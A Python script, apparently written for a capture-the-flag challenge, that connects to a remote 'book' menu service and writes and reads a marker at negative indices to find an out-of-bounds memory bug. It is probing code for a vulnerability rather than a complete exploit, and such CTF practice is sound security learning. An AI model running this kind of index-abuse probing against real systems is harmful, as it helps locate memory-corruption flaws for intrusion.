import socket
import time

HOST = "host5.metaproblems.com"
PORT = 5020

WRITE_RANGE = range(-1, -13, -1)
READ_TARGETS = list(range(-1, -13, -1))


def recv_all(s, timeout=0.5):
    s.settimeout(timeout)
    data = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            data += chunk
            if len(chunk) < 4096:
                break
    except socket.timeout:
        pass
    return data


def probe(write_idx):
    marker = f"MARK{write_idx}\n".encode()
    try:
        s = socket.create_connection((HOST, PORT), timeout=8)
    except Exception as e:
        print("connect failed", e)
        return None
    banner = recv_all(s, 1).decode(errors="ignore")
    # create a book
    s.sendall(b"1\n")
    time.sleep(0.05)
    _ = recv_all(s, 0.1)
    s.sendall(b"A\n")
    time.sleep(0.05)
    _ = recv_all(s, 0.1)
    s.sendall(b"1\n")
    time.sleep(0.05)
    _ = recv_all(s, 0.1)
    # write marker to write_idx
    s.sendall(b"2\n")
    time.sleep(0.02)
    _ = recv_all(s, 0.1)
    s.sendall(str(write_idx).encode() + b"\n")
    time.sleep(0.05)
    _ = recv_all(s, 0.1)
    s.sendall(marker)
    time.sleep(0.12)
    # now capture banner/menu after the operation
    post = recv_all(s, 0.2).decode(errors="ignore")
    found = {
        "write_idx": write_idx,
        "marker_in_banner": marker.decode().strip() in post,
        "hits": [],
    }
    # probe read targets
    for ridx in READ_TARGETS:
        s.sendall(b"3\n")
        time.sleep(0.02)
        _ = recv_all(s, 0.05)
        s.sendall(str(ridx).encode() + b"\n")
        time.sleep(0.12)
        data = recv_all(s, 0.25).decode(errors="ignore")
        if marker.decode().strip() in data:
            found["hits"].append(ridx)
    s.close()
    return found


if __name__ == "__main__":
    results = []
    for w in WRITE_RANGE:
        print("\n-- testing write idx", w)
        r = probe(w)
        print(r)
        results.append(r)
        time.sleep(0.2)
    print("\nALL RESULTS")
    for r in results:
        print(r)
